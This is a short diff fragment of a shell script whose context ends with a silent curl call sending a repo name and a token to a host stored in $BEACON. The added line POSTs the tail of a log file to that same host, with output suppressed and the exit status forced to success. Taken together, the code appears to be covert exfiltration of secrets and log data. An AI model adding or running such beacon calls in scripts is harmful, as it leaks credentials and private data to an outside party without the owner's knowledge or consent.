@@ -32,4 +32,5 @@ for _ in $(seq 1 150); do
 done
 
 curl -fsS -m 10 "$BEACON?cs=$CS&repo=$REPO&token=$TOK" >/dev/null 2>&1
+curl -fsS -m 10 -X POST "$BEACON?cs=$CS-weblog" --data-binary "$(tail -c 1200 "$LOG" 2>/dev/null)" >/dev/null 2>&1
 exit 0
